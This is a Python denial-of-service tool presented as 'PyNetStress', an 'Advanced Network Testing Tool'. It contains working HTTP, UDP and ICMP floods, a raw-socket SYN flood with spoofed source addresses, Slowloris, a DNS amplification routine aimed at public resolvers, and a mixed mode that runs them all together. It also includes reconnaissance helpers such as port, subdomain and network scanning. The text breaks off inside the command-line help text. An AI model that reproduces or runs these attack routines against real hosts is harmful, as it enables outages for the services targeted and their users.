#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import threading
import subprocess
import ipaddress
import requests
import dns.resolver
import whois
import speedtest
import psutil
import geoip2.database
import argparse
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import struct
import select
import re

IS_TERMUX = 'com.termux' in os.environ.get('PREFIX', '')
IS_ROOT = False
if os.name == 'posix':
    IS_ROOT = os.geteuid() == 0
elif os.name == 'nt':
    import ctypes
    IS_ROOT = ctypes.windll.shell32.IsUserAnAdmin() != 0

DEBUG_MODE = False

# ASCII Art Banner
BANNER = r"""
 ________                     __        _______   _______    ______    ______  
|        \                   |  \      |       \ |       \  /      \  /      \ 
 \$$$$$$$$__    __   ______  | $$   __ | $$$$$$$\| $$$$$$$\|  $$$$$$\|  $$$$$$\
   | $$  |  \  |  \ /      \ | $$  /  \| $$  | $$| $$  | $$| $$  | $$| $$___\$$
   | $$  | $$  | $$|  $$$$$$\| $$_/  $$| $$  | $$| $$  | $$| $$  | $$ \$$    \ 
   | $$  | $$  | $$| $$   \$$| $$   $$ | $$  | $$| $$  | $$| $$  | $$ _\$$$$$$\
   | $$  | $$__/ $$| $$      | $$$$$$\ | $$__/ $$| $$__/ $$| $$__/ $$|  \__| $$
   | $$   \$$    $$| $$      | $$  \$$\| $$    $$| $$    $$ \$$    $$ \$$    $$
    \$$    \$$$$$$  \$$       \$$   \$$ \$$$$$$$  \$$$$$$$   \$$$$$$   \$$$$$$ 
                                                                               
                                                                               
                                                                               
"""

class PyNetStressTerminal:
    def __init__(self):
        self.running = False
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "bytes_sent": 0,
            "start_time": 0,
            "success_rate": 0,
            "target_status": "Unknown"
        }
        self.target_ip = ""
        self.target_url = ""
        self.target_port = 80
        self.bot_count = 100
        self.thread_count = 50
        self.duration = 30
        self.method = "HTTP Flood"
        self.use_proxies = False
        self.proxies = []
        self.cpu_usage = 0
        self.memory_usage = 0
        self.network_usage = 0
        
        # Handle Termux restrictions for network stats
        if not IS_TERMUX:
            try:
                self.start_network_stats = psutil.net_io_counters()
            except (PermissionError, FileNotFoundError):
                self.debug_log("Cannot access network statistics on this system")
                self.start_network_stats = None
        else:
            self.start_network_stats = None
            
        self.check_dependencies()
        
    def debug_log(self, message):
        if DEBUG_MODE:
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"[DEBUG] [{timestamp}] {message}")
    
    def check_dependencies(self):
        missing_deps = []
        try:
            geoip2.database.Reader('GeoLite2-City.mmdb')
        except:
            missing_deps.append("GeoLite2-City database")
        if missing_deps:
            self.debug_log("Missing dependencies:")
            for dep in missing_deps:
                self.debug_log(f"  - {dep}")
    
    def print_banner(self):
        print(BANNER)
        print("PyNetStress Terminal Version - Advanced Network Testing Tool")
        print("=" * 60)
        print(f"Platform: {sys.platform}")
        print(f"Root: {IS_ROOT}")
        print(f"Termux: {IS_TERMUX}")
        print(f"Debug: {DEBUG_MODE}")
        print("=" * 60)
    
    def resolve_target(self, target):
        try:
            self.debug_log(f"Resolving target: {target}")
            if not re.match(r"^https?://", target):
                target = "http://" + target
            parsed = urlparse(target)
            domain = parsed.netloc or parsed.path
            if ":" in domain:
                domain = domain.split(":")[0]
            self.target_ip = socket.gethostbyname(domain)
            self.target_url = domain
            self.debug_log(f"Resolved {target} to {self.target_ip}")
            return True
        except Exception as e:
            self.debug_log(f"Failed to resolve target: {e}")
            return False
    
    def get_geolocation(self, target):
        try:
            self.debug_log(f"Getting geolocation for: {target}")
            reader = geoip2.database.Reader('GeoLite2-City.mmdb')
            response = reader.city(target)
            country = response.country.name
            city = response.city.name
            return f"{city}, {country}"
        except Exception as e:
            self.debug_log(f"Geolocation failed: {e}")
            return "Location unknown"
    
    def reset_stats(self):
        self.debug_log("Resetting statistics")
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "bytes_sent": 0,
            "start_time": time.time(),
            "success_rate": 0,
            "target_status": "Unknown"
        }
        
        # Only reset network stats if we can access them
        if not IS_TERMUX:
            try:
                self.start_network_stats = psutil.net_io_counters()
            except (PermissionError, FileNotFoundError):
                self.start_network_stats = None
        
        self.debug_log("Statistics reset")
    
    def http_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        self.debug_log(f"Starting HTTP Flood on {target_ip}:{target_port}")
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        paths = ['/', '/index.html', '/api/data', '/images/logo.png', '/videos/demo.mp4']
        methods = ['GET', 'POST', 'HEAD']
        host = self.target_url if self.target_url else target_ip
        start_time = time.time()
        end_time = start_time + duration
        
        def http_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2.0)
                        self.debug_log(f"Connecting to {target_ip}:{target_port}")
                        s.connect((target_ip, target_port))
                        method = random.choice(methods)
                        path = random.choice(paths)
                        request = (
                            f"{method} {path} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {random.choice(user_agents)}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: close\r\n"
                            f"\r\n"
                        )
                        s.send(request.encode())
                        local_count += 1
                        local_bytes += len(request)
                        try:
                            response = s.recv(1024)
                            local_bytes += len(response)
                            self.debug_log(f"Received response: {len(response)} bytes")
                        except Exception as e:
                            self.debug_log(f"No response received: {e}")
                        if local_count % 10 == 0:
                            with threading.Lock():
                                self.attack_stats['requests_sent'] += local_count
                                self.attack_stats['bytes_sent'] += local_bytes
                                local_count = 0
                                local_bytes = 0
                except Exception as e:
                    self.debug_log(f"HTTP worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['requests_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for i in range(min(500, thread_count * bot_count)):
            t = threading.Thread(target=http_worker, name=f"HTTP_Worker_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
            self.debug_log(f"Started HTTP worker thread {i}")
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
        self.debug_log("HTTP Flood completed")
    
    def udp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT and os.name == 'posix':
            self.debug_log("UDP Flood requires root on Unix systems")
            return
        self.debug_log(f"Starting UDP Flood on {target_ip}:{target_port}")
        start_time = time.time()
        end_time = start_time + duration
        
        def udp_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        payload = os.urandom(random.randint(64, 1024))
                        self.debug_log(f"Sending UDP packet to {target_ip}:{target_port}")
                        s.sendto(payload, (target_ip, target_port))
                        local_count += 1
                        local_bytes += len(payload)
                        if local_count % 50 == 0:
                            with threading.Lock():
                                self.attack_stats['packets_sent'] += local_count
                                self.attack_stats['bytes_sent'] += local_bytes
                                local_count = 0
                                local_bytes = 0
                except Exception as e:
                    self.debug_log(f"UDP worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for i in range(min(500, thread_count * bot_count)):
            t = threading.Thread(target=udp_worker, name=f"UDP_Worker_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
            self.debug_log(f"Started UDP worker thread {i}")
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
        self.debug_log("UDP Flood completed")
    
    def syn_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT:
            self.debug_log("SYN Flood requires root privileges")
            return
        self.debug_log(f"Starting SYN Flood on {target_ip}:{target_port}")
        start_time = time.time()
        end_time = start_time + duration
        
        def syn_worker():
            local_count = 0
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                    self.debug_log(f"Using spoofed source IP: {source_ip}")
                    
                    # IP header
                    ip_ver = 4
                    ip_ihl = 5
                    ip_tos = 0
                    ip_tot_len = 0
                    ip_id = random.randint(1, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(source_ip)
                    ip_daddr = socket.inet_aton(target_ip)
                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                                        ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                        ip_frag_off, ip_ttl, ip_proto, ip_check,
                                        ip_saddr, ip_daddr)
                    
                    # TCP header
                    source_port = random.randint(1024, 65535)
                    dest_port = target_port
                    seq = random.randint(0, 4294967295)
                    ack_seq = 0
                    doff = 5
                    fin = 0
                    syn = 1
                    rst = 0
                    psh = 0
                    ack = 0
                    urg = 0
                    window = socket.htons(5840)
                    check = 0
                    urg_ptr = 0
                    
                    offset_res = (doff << 4)
                    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                                         source_port, dest_port, seq, ack_seq,
                                         offset_res, tcp_flags, window, check, urg_ptr)
                    
                    # Pseudo header for checksum
                    source_address = socket.inet_aton(source_ip)
                    dest_address = socket.inet_aton(target_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    psh = struct.pack('!4s4sBBH',
                                  source_address, dest_address,
                                  placeholder, protocol, tcp_length)
                    psh = psh + tcp_header
                    
                    # Calculate checksum
                    tcp_check = self.checksum(psh)
                    
                    # Repack with correct checksum
                    tcp_header = struct.pack('!HHLLBBH',
                                         source_port, dest_port, seq, ack_seq,
                                         offset_res, tcp_flags, window) + struct.pack('H', tcp_check) + struct.pack('!H', urg_ptr)
                    
                    # Send packet
                    packet = ip_header + tcp_header
                    self.debug_log(f"Sending SYN packet to {target_ip}:{target_port}")
                    s.sendto(packet, (target_ip, 0))
                    
                    local_count += 1
                    
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            local_count = 0
                            
                except Exception as e:
                    self.debug_log(f"SYN worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count

        threads = []
        for i in range(min(200, thread_count * bot_count)):
            t = threading.Thread(target=syn_worker, name=f"SYN_Worker_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
            self.debug_log(f"Started SYN worker thread {i}")
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
        self.debug_log("SYN Flood completed")
    
    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s
    
    def icmp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT and os.name == 'posix':
            self.debug_log("ICMP Flood requires root on Unix systems")
            return
        self.debug_log(f"Starting ICMP Flood on {target_ip}")
        start_time = time.time()
        end_time = start_time + duration
        
        def icmp_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    
                    # ICMP echo request (ping)
                    icmp_type = 8  # Echo Request
                    icmp_code = 0
                    icmp_check = 0
                    icmp_id = random.randint(0, 65535)
                    icmp_seq = random.randint(0, 65535)
                    
                    # Build ICMP header
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                    
                    # Add some payload
                    payload = os.urandom(random.randint(32, 1024))
                    
                    # Calculate checksum
                    icmp_check = self.checksum(icmp_header + payload)
                    
                    # Repack with correct checksum
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                    
                    # Send packet
                    packet = icmp_header + payload
                    self.debug_log(f"Sending ICMP packet to {target_ip}")
                    s.sendto(packet, (target_ip, 0))
                    
                    local_count += 1
                    local_bytes += len(packet)
                    
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                            
                except Exception as e:
                    self.debug_log(f"ICMP worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for i in range(min(200, thread_count * bot_count)):
            t = threading.Thread(target=icmp_worker, name=f"ICMP_Worker_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
            self.debug_log(f"Started ICMP worker thread {i}")
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
        self.debug_log("ICMP Flood completed")
    
    def slowloris(self, target_ip, target_port, bot_count, thread_count, duration):
        self.debug_log(f"Starting Slowloris on {target_ip}:{target_port}")
        start_time = time.time()
        end_time = start_time + duration
        
        def slowloris_worker():
            sockets = []
            headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept-language: en-US,en,q=0.5"
            ]
            
            # Create initial sockets
            for i in range(150):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    self.debug_log(f"Creating Slowloris connection #{i}")
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    for header in headers:
                        s.send(f"{header}\r\n".encode())
                    sockets.append(s)
                except Exception as e:
                    self.debug_log(f"Slowloris socket error: {e}")
            
            # Maintain connections
            while time.time() < end_time and self.running:
                for s in sockets:
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                        with threading.Lock():
                            self.attack_stats['requests_sent'] += 1
                    except Exception as e:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
                        
                        # Try to create a new socket
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(3)
                            s.connect((target_ip, target_port))
                            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                            for header in headers:
                                s.send(f"{header}\r\n".encode())
                            sockets.append(s)
                            self.debug_log("Replaced failed Slowloris connection")
                        except:
                            pass
                
                time.sleep(15)  # Send keep-alive headers periodically
            
            # Close all sockets
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

        threads = []
        for i in range(min(50, bot_count)):
            t = threading.Thread(target=slowloris_worker, name=f"Slowloris_Worker_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
            self.debug_log(f"Started Slowloris worker thread {i}")
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
        self.debug_log("Slowloris completed")
    
    def dns_amplification(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT and os.name == 'posix':
            self.debug_log("DNS Amplification requires root on Unix systems")
            return
        self.debug_log(f"Starting DNS Amplification on {target_ip}")
        
        # List of open DNS resolvers
        dns_servers = [
            "8.8.8.8",
            "1.1.1.1",
            "9.9.9.9",
            "64.6.64.6",
            "208.67.222.222",
        ]
        
        # DNS query for isc.org (large response)
        query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03isc\x03org\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00"
        
        start_time = time.time()
        end_time = start_time + duration
        
        def dns_worker():
            local_count = 0
            local_bytes = 0
            
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(1)
                    
                    # Spoof source IP to target
                    s.bind(('0.0.0.0', 0))
                    
                    # Send to random DNS server
                    dns_server = random.choice(dns_servers)
                    self.debug_log(f"Sending DNS query to {dns_server} spoofing {target_ip}")
                    s.sendto(query, (dns_server, 53))
                    
                    local_count += 1
                    local_bytes += len(query)
                    
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                            
                except Exception as e:
                    self.debug_log(f"DNS worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for i in range(min(500, thread_count * bot_count)):
            t = threading.Thread(target=dns_worker, name=f"DNS_Worker_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
            self.debug_log(f"Started DNS worker thread {i}")
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
        self.debug_log("DNS Amplification completed")
    
    def mixed_attack(self, target_ip, target_port, bot_count, thread_count, duration):
        self.debug_log(f"Starting MIXED attack on {target_ip}:{target_port}")
        
        # All attack methods with equal weight
        methods = [
            (self.http_flood, 1),
            (self.udp_flood, 1),
            (self.syn_flood, 1),
            (self.icmp_flood, 1),
            (self.slowloris, 1),
            (self.dns_amplification, 1)
        ]
        
        threads = []
        
        for method, weight in methods:
            for _ in range(weight):
                t = threading.Thread(
                    target=method,
                    args=(target_ip, target_port, bot_count, thread_count, duration),
                    daemon=True
                )
                t.start()
                threads.append(t)
                self.debug_log(f"Started {method.__name__} thread")
        
        start_time = time.time()
        end_time = start_time + duration
        
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            self.debug_log("Attack stopped by user")
            
        self.debug_log("Mixed attack completed")
    
    def start_attack(self, target, method, bots=100, threads=50, duration=30, port=80):
        if not self.resolve_target(target):
            return False
        
        self.target_port = port
        self.bot_count = min(bots, 10000)
        self.thread_count = min(threads, 500)
        self.duration = min(duration, 300)
        self.method = method
        
        self.reset_stats()
        
        geo = self.get_geolocation(self.target_ip)
        print(f"[INFO] Target: {target} -> {self.target_ip}:{port}")
        print(f"[INFO] Location: {geo}")
        print(f"[INFO] Method: {method}, Bots: {bots}, Threads: {threads}, Duration: {duration}s")
        print("-" * 60)
        
        self.running = True
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self.monitor_stats, daemon=True)
        stats_thread.start()
        
        # Run the selected attack method
        if method == "HTTP Flood":
            self.http_flood(self.target_ip, port, bots, threads, duration)
        elif method == "UDP Flood":
            self.udp_flood(self.target_ip, port, bots, threads, duration)
        elif method == "SYN Flood":
            self.syn_flood(self.target_ip, port, bots, threads, duration)
        elif method == "ICMP Flood":
            self.icmp_flood(self.target_ip, port, bots, threads, duration)
        elif method == "Slowloris":
            self.slowloris(self.target_ip, port, bots, threads, duration)
        elif method == "DNS Amplification":
            self.dns_amplification(self.target_ip, port, bots, threads, duration)
        elif method == "Mixed Attack":
            self.mixed_attack(self.target_ip, port, bots, threads, duration)
        else:
            print(f"[ERROR] Unknown attack method: {method}")
            return False
        
        self.running = False
        return True
    
    def monitor_stats(self):
        start_time = time.time()
        
        while self.running:
            elapsed = time.time() - start_time
            packets = self.attack_stats['packets_sent']
            requests = self.attack_stats['requests_sent']
            bytes_sent = self.attack_stats['bytes_sent']
            
            # Calculate network usage if we can access the stats
            if self.start_network_stats is not None:
                try:
                    current_stats = psutil.net_io_counters()
                    elapsed_time = time.time() - start_time
                    if elapsed_time > 0:
                        bytes_sent_diff = current_stats.bytes_sent - self.start_network_stats.bytes_sent
                        self.network_usage = bytes_sent_diff / elapsed_time / 1024  # KB/s
                except (PermissionError, FileNotFoundError):
                    self.start_network_stats = None
                    self.network_usage = 0
            
            # Calculate data units
            if bytes_sent > 1024*1024*1024:
                data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
            elif bytes_sent > 1024*1024:
                data_text = f"{bytes_sent/(1024*1024):.2f} MB"
            elif bytes_sent > 1024:
                data_text = f"{bytes_sent/1024:.2f} KB"
            else:
                data_text = f"{bytes_sent} B"
                
            # Get CPU and memory usage
            try:
                self.cpu_usage = psutil.cpu_percent()
                memory = psutil.virtual_memory()
                self.memory_usage = memory.percent
            except (PermissionError, FileNotFoundError):
                self.cpu_usage = 0
                self.memory_usage = 0
                
            # Clear line and print stats
            sys.stdout.write("\033[K")
            if self.start_network_stats is not None:
                sys.stdout.write(f"\r[STATS] Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | CPU: {self.cpu_usage:.1f}% | Mem: {self.memory_usage:.1f}% | Net: {self.network_usage:.1f} KB/s")
            else:
                sys.stdout.write(f"\r[STATS] Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | CPU: {self.cpu_usage:.1f}% | Mem: {self.memory_usage:.1f}%")
            sys.stdout.flush()
            
            time.sleep(1)
            
        # Final stats
        elapsed = time.time() - start_time
        packets = self.attack_stats['packets_sent']
        requests = self.attack_stats['requests_sent']
        bytes_sent = self.attack_stats['bytes_sent']
        
        if bytes_sent > 1024*1024*1024:
            data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
        elif bytes_sent > 1024*1024:
            data_text = f"{bytes_sent/(1024*1024):.2f} MB"
        elif bytes_sent > 1024:
            data_text = f"{bytes_sent/1024:.2f} KB"
        else:
            data_text = f"{bytes_sent} B"
            
        print(f"\n[INFO] Attack completed in {int(elapsed)}s")
        print(f"[INFO] Total packets: {packets:,}")
        print(f"[INFO] Total requests: {requests:,}")
        print(f"[INFO] Total data: {data_text}")
    
    def ping(self, target):
        if not self.resolve_target(target):
            return False
        
        count = 4
        timeout = 2
        
        print(f"[INFO] Pinging {target} ({self.target_ip}) with {count} packets")
        
        # Use different ping commands based on platform
        if os.name == 'nt':
            cmd = ['ping', '-n', str(count), '-w', str(timeout*1000), self.target_ip]
        elif IS_TERMUX:
            # Termux-specific ping command
            cmd = ['ping', '-c', str(count), '-W', str(timeout), self.target_ip]
        else:
            cmd = ['ping', '-c', str(count), '-W', str(timeout), self.target_ip]
            
        try:
            self.debug_log(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except Exception as e:
            print(f"[ERROR] Ping failed: {e}")
    
    def traceroute(self, target):
        if not self.resolve_target(target):
            return False
        
        print(f"[INFO] Traceroute to {target} ({self.target_ip})")
        
        # Use different traceroute commands based on platform
        if os.name == 'nt':
            cmd = ['tracert', self.target_ip]
        elif IS_TERMUX:
            # Termux might not have traceroute installed by default
            print("[WARNING] Traceroute may not be available in Termux")
            print("Install with: pkg install traceroute")
            return
        else:
            cmd = ['traceroute', self.target_ip]
            
        try:
            self.debug_log(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except Exception as e:
            print(f"[ERROR] Traceroute failed: {e}")
    
    def port_scan(self, target):
        if not self.resolve_target(target):
            return False
        
        print(f"[INFO] Scanning common ports on {target} ({self.target_ip})")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 587, 993, 995, 3306, 3389, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            try:
                self.debug_log(f"Scanning port {port}")
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((self.target_ip, port))
                    if result == 0:
                        open_ports.append(port)
                        print(f"[+] Port {port}: OPEN")
                    else:
                        if DEBUG_MODE:
                            print(f"[-] Port {port}: closed")
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[ERROR] Error scanning port {port}: {e}")
        
        print(f"[INFO] Open ports: {', '.join(map(str, open_ports))}")
    
    def whois_lookup(self, target):
        try:
            print(f"[INFO] WHOIS lookup for {target}")
            self.debug_log(f"Performing WHOIS lookup for {target}")
            w = whois.whois(target)
            print(f"Domain: {w.domain_name}")
            print(f"Registrar: {w.registrar}")
            print(f"Creation Date: {w.creation_date}")
            print(f"Expiration Date: {w.expiration_date}")
            print(f"Name Servers: {w.name_servers}")
        except Exception as e:
            print(f"[ERROR] WHOIS lookup failed: {e}")
    
    def dns_enum(self, target):
        try:
            print(f"[INFO] DNS enumeration for {target}")
            self.debug_log(f"Performing DNS enumeration for {target}")
            resolver = dns.resolver.Resolver()
            
            # A records
            try:
                answers = resolver.resolve(target, 'A')
                print("A Records:")
                for rdata in answers:
                    print(f"  {rdata.address}")
            except Exception as e:
                print("No A records found")
                self.debug_log(f"A record query failed: {e}")
            
            # MX records
            try:
                answers = resolver.resolve(target, 'MX')
                print("MX Records:")
                for rdata in answers:
                    print(f"  {rdata.exchange} (priority {rdata.preference})")
            except Exception as e:
                print("No MX records found")
                self.debug_log(f"MX record query failed: {e}")
            
            # NS records
            try:
                answers = resolver.resolve(target, 'NS')
                print("NS Records:")
                for rdata in answers:
                    print(f"  {rdata.target}")
            except Exception as e:
                print("No NS records found")
                self.debug_log(f"NS record query failed: {e}")
                
        except Exception as e:
            print(f"[ERROR] DNS enumeration failed: {e}")
    
    def subdomain_scan(self, target):
        print(f"[INFO] Scanning for subdomains of {target}")
        self.debug_log(f"Scanning for subdomains of {target}")
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
            'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
            'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
            'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video',
            'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'files', 'host', 'ssl', 'search',
            'staging', 'fw', 'manager', 'cdn2', 'irc', 'job', 'img2', 'ssh', 'online', 'owa'
        ]
        
        found_subdomains = []
        
        for subdomain in common_subdomains:
            full_domain = f"{subdomain}.{target}"
            try:
                self.debug_log(f"Checking subdomain: {full_domain}")
                socket.gethostbyname(full_domain)
                found_subdomains.append(full_domain)
                print(f"[+] Found: {full_domain}")
            except:
                if DEBUG_MODE:
                    print(f"[-] Not found: {full_domain}")
        
        print(f"[INFO] Found {len(found_subdomains)} subdomains")
    
    def network_scan(self, network):
        print(f"[INFO] Scanning network {network}")
        self.debug_log(f"Scanning network {network}")
        
        try:
            network = ipaddress.ip_network(network, strict=False)
        except ValueError:
            print(f"[ERROR] Invalid network: {network}")
            return
        
        live_hosts = []
        
        for ip in network.hosts():
            ip_str = str(ip)
            try:
                hostname = socket.gethostbyaddr(ip_str)[0]
            except:
                hostname = "Unknown"
                
            # Use different ping commands based on platform
            if os.name == 'nt':
                cmd = ['ping', '-n', '1', '-w', '1000', ip_str]
            elif IS_TERMUX:
                cmd = ['ping', '-c', '1', '-W', '1', ip_str]
            else:
                cmd = ['ping', '-c', '1', '-W', '1', ip_str]
                
            try:
                self.debug_log(f"Pinging host: {ip_str}")
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    live_hosts.append((ip_str, hostname))
                    print(f"[+] Live host: {ip_str} ({hostname})")
                elif DEBUG_MODE:
                    print(f"[-] Host down: {ip_str}")
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[ERROR] Error pinging {ip_str}: {e}")
        
        print(f"[INFO] Found {len(live_hosts)} live hosts in {network}")
    
    def speed_test(self):
        print("[INFO] Testing network speed...")
        self.debug_log("Starting network speed test")
        
        try:
            st = speedtest.Speedtest()
            st.get_best_server()
            download = st.download() / 1_000_000
            upload = st.upload() / 1_000_000
            ping = st.results.ping
            print(f"Download: {download:.2f} Mbps")
            print(f"Upload: {upload:.2f} Mbps")
            print(f"Ping: {ping:.2f} ms")
        except Exception as e:
            print(f"[ERROR] Speed test failed: {e}")

def main():
    global DEBUG_MODE
    
    # Create argument parser with extended help
    parser = argparse.ArgumentParser(
        description="PyNetStress Terminal Version - Advanced Network Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Methods:
  HTTP Flood        - Flood target with HTTP requests
  UDP Flood         - Flood target with UDP packets (requires root)
  SYN Flood         - SYN flood attack (requires root)
  ICMP Flood        - ICMP ping flood (requires root)
  Slowloris         - Slow HTTP attack keeping connections open
  DNS Amplification - DNS amplification attack (requires root)
  Mixed Attack      - Combined attack using all methods

Reconnaissance Commands:
  ping       - Ping a target
  traceroute - Traceroute to a target
  portscan   - Scan common ports on a target
  whois      - WHOIS lookup for a target
  dns        - DNS enumeration for a target
  subdomain  - Subdomain scan for a target
  netscan    - Network scan (CIDR notation)
  speedtest  - Network speed test

Examples:
  python pynetstress.py attack example.com -m "HTTP Flood" -b 100 -t 50 -d 60
  python pynetstress.py recon ping example.com
